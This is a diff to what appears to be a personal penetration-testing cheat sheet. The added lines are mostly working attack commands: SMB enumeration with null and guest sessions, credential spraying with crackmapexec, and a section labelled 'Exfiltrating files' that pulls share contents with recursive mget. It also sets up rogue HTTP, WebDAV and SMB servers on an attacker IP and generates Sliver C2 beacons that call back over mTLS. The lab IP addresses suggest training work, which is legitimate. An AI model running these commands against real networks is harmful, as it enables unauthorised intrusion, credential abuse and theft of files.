@@ -188,8 +188,54 @@ Run `docker run -p 3000:3000 lissy93/web-check`, then open `127.0.0.1:3000` -> r
 
 - https://github.com/jthack/ffufai - ffuf with your AI API key
 
+Windows Network Service enumeration
 ```bash
+rpcclient -U "" -N $IP
+enum4linux -a -v $IP | tee -a e4l-$IP.txt
 # User:User passwords
+
+# Test permissions by flag
+smbmap -H $IP
+smbmap -H $IP -u ''
+smbmap -H $IP -u 'Guest' -p 'Anonymous'
+smbmap -H $IP -u 'Guest' -p ''
+# Always recursively check all credentials and permissions
+smbmap -H $IP -u $user -p $password
+# Recursively list dirs, files 
+smbmap -H $IP -R --exclude SYSVOL,IPC$
+# Recursive list contents of directory
+smbmap -H $IP -u $user -p $password -r --exclude SYSVOL,IPC$
+# Download a specifc file
+smbmap -H $IP -u $user -p $password  --download user$/$username/Documents/$file.txt
+
+# list share with valid user and password
+smbclient -L $IP -U username%password
+# connect to share 
+smbclient //$IP/$share -U username%password	
+
+smbclient -L $IP			# List shares using NULL session
+smbclient -L //$IP/tmp
+smbclient -U '' -L //$IP/anon
+smbclient -N //$IP/tmp --option='client min protocol=NT1' # legacy
+smbclient -U //$IP/share\ with\ whitespace # \ to escape whitespace
+# To escape white space in smb client!
+smbclient //10.10.10.10/annoying\ white\ spaces\ share
+smb: \> cd "Active Directory\ " # will work to escape the whitespace
+
+# Exfiltrating files
+smb: \> prompt off 
+smb: \> recurse on 
+smb: \> mget * # Download everything instead of manually 
+
+# Download a file from a specific share
+smbclient //$IP/$share -c 'cd folder; ls' password -U username # list
+smbclient //$IP/$sahre -c 'cd folder;get desired_file_name' password -U username 
+# Copy a file to a specific share
+smbclient //$IP/$share -c 'put /var/www/my_local_file.txt .\target_folder\target_file.txt' password -U username 
+
+# Scan NetBIOS name servers, enumerate connection points across a network
+nbtscan -r $IP/$CIDR
+
 crackmapexec smb $ip -u users.txt -p users.txt --continue-on-success --no-brute
 # After first domain user try these
 crackmapexec ldap -L
@@ -205,7 +251,7 @@ maq # machineAccountQuota how many machine accounts a user can make; Default is 
 wpscan --url $url -rua -e --api-token $APIKEY
 ```
 
-```
+```bash
 cat nmap/.nmap | grep open | awk -F/ '{print $1}' | tr -s '\n' '-' | sed 's/-/\n- /g'
 ```
 
@@ -237,8 +283,11 @@ macchanger -m <MAC> <int>
 ## Rogue Servers - Infil and Exfil 
 
 ```bash
+# python web server
 ip a && ls -la && python3 -m http.server 8443
+# wsgidav server
 wsgidav --port=80 --host=192.168.45.231 --root=/tmp --auth=anonymous
+# Impacket rogue smb share
 impacket-smbserver -ip 192.168.45.231 share $(pwd) -smb2support  -username user -password pass
 ```
 
@@ -461,7 +510,7 @@ ExitOnSession false
 
 ## Beacons and Shells 
 
-Linux
+Sliver-O'Clock
 ```bash
 generate beacon --mtls 10.50.104.57:8445 --arch amd64 --os linux --save /home/kali/Holo-2024/sliver.bin
 # sliver listener
@@ -487,7 +536,7 @@ upx OneDrive.exe
 ```
 
 
-Sliver-O'Clock
+
 ```go
 generate beacon --mtls 192.168.45.231:17200 --arch amd64 --os windows
 mtls -L 192.168.45.231 -l 17200
